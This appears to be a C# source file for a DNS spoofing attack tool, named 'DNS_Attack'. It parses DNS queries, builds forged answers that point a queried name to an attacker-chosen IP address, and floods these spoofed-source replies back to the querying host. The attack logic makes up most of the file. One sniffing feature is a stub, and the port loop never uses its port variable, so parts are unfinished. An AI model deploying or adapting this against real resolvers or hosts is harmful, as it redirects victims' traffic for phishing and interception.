// Based on https://routley.io/tech/2017/12/28/hand-writing-dns-messages.html

using System;
using System.Net;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace DNS_Attack {
    public class DNSAttack {
        private static int dnsPort = 53;
        private static int numPorts = 65536;
        private static string answerFlags = "8180";
        private static string answerNumQuestions = "0001";
        private static string answerNumAnswers = "0001";
        private static string answerNumAuthorityRecords = "0000";
        private static string answerNumAdditionalRecords = "0000";
        private static byte[] headerWithoutId = Utils.HexStringToByteArray(answerFlags + answerNumQuestions + answerNumAnswers + answerNumAuthorityRecords + answerNumAdditionalRecords);
        private static string answer_name = "c00c";
        private static string answer_type = "0001";
        private static string answer_class = "0001";
        private static byte[] answerSectionBegin = Utils.HexStringToByteArray(answer_name + answer_type + answer_class);
        private static byte[] answerSectionTTL = Utils.HexStringToByteArray("0000000a");
        private static byte[] answerSectionIpLength = Utils.HexStringToByteArray("0004");

        public void ShowDNSQuery(byte[] dnsQuery) {
            Console.WriteLine("ID: " + Utils.ByteArrayToHexString(Utils.GetPartOfByteArray(dnsQuery, 0, 1)));
            Console.WriteLine("Flags: " + Utils.ByteArrayToHexString(Utils.GetPartOfByteArray(dnsQuery, 2, 3)));
            Console.WriteLine("Num. Questions: " + Utils.ByteArrayToHexString(Utils.GetPartOfByteArray(dnsQuery, 4, 5)));
            Console.WriteLine("Num. Answers RRs: " + Utils.ByteArrayToHexString(Utils.GetPartOfByteArray(dnsQuery, 6, 7)));
            Console.WriteLine("Num. Authority RRs: " + Utils.ByteArrayToHexString(Utils.GetPartOfByteArray(dnsQuery, 8, 9)));
            Console.WriteLine("Num. Additional RRs: " + Utils.ByteArrayToHexString(Utils.GetPartOfByteArray(dnsQuery, 10, 11)));
            Console.WriteLine("Queried URL: " + ParseDNSQueryURL(dnsQuery));
        }

        public string ParseDNSQueryURL(byte[] dnsQuery) {
            List<string> urlParts = new List<string>();
            int pos = 12;
            int length = (int)dnsQuery[pos];
            while (length != 0) {
                pos++;
                string part = Encoding.UTF8.GetString(dnsQuery, pos, length);
                urlParts.Add(part);
                pos += length;
                length = (int)dnsQuery[pos];
            }
            StringBuilder url = new StringBuilder();
            url.Append(urlParts[0]);
            for (int i = 1; i < urlParts.Count; i++)
                url.Append(".").Append(urlParts[i]);
            return url.ToString();
        }

        public byte[] GenerateDNSAnswer(byte[] dnsQuery, string erroneousIP) {
            int urlLength = ParseDNSQueryURL(dnsQuery).Length + 1;
            byte[] answer = new byte[urlLength + 33];
            Array.Copy(dnsQuery, 0, answer, 0, 2);  // ID
            Array.Copy(headerWithoutId, 0, answer, 2, 10 /* headerWithoutId.Length */);
            Array.Copy(dnsQuery, 12, answer, 12, urlLength + 5); // Query [URL + URL terminator (0x00) + QType (16 bits) + QClass (16 bits)]
            Array.Copy(answerSectionBegin, 0, answer, urlLength + 17, 6 /* answerSectionBegin.Length */);
            Array.Copy(answerSectionTTL, 0, answer, urlLength + 23, 4 /* answerSectionTTL.Length */);
            Array.Copy(answerSectionIpLength, 0, answer, urlLength + 27, 2 /* answerSectionIpLength.Length */);
            string[] ipParts = erroneousIP.Split('.');
            for (int i = 0; i < ipParts.Length; i++)
                answer[urlLength + 29 + i] = (byte)(int.Parse(ipParts[i]));
            return answer;
        }

        public void SendFakeAnswerToSniffedQuery(int timeoutMillis, string erroneousIP) {
            Console.WriteLine("This feature is not implemented.");
        }

        /* In order for this function to work, the attacked machine
            needs to query the machine where this function is running. */
        public void SendFakeAnswerToHost(string fakeSourceIP, int timeoutMillis, string erroneousIP) {
            int numCores = Environment.ProcessorCount;
            try {
                UDPSocket udpSocket = new UDPSocket(dnsPort);
                UDPPacketData dnsQueryPacket = udpSocket.ReceiveUDPPacket();
                byte[] dnsQuery = dnsQueryPacket.Data;
                ShowDNSQuery(dnsQuery);
                byte[] answer = GenerateDNSAnswer(dnsQuery, erroneousIP);

                DateTime loopStop = DateTime.UtcNow.AddMilliseconds(timeoutMillis);
                while (DateTime.UtcNow < loopStop) {
                    int portsByCore = numPorts / numCores;
                    for (int assignedPorts = 0; assignedPorts < numPorts; assignedPorts += portsByCore) {
                        int firstPort = assignedPorts;
                        int lastPort = Math.Min(assignedPorts + portsByCore, numPorts) - 1;
                        //new Thread(() -> {
                        for (int port = firstPort; port <= lastPort; port++) {
                            MyUDPSocket.SendUDPPacket(fakeSourceIP, dnsPort, dnsQueryPacket.SenderIP, dnsQueryPacket.SenderPort, answer);
                            /*try {
                                udpSocket.SendUDPPacket(dnsQueryPacket.SenderIP, dnsQueryPacket.SenderPort, answer);
                            } catch (SocketException e) {
                                Console.WriteLine(e);
                            }*/
                        }
                        //}).start();
                    }
                }
                udpSocket.Close();
            }
            catch (SocketException e) {
                Console.WriteLine(e);
            }
        }
    }
}
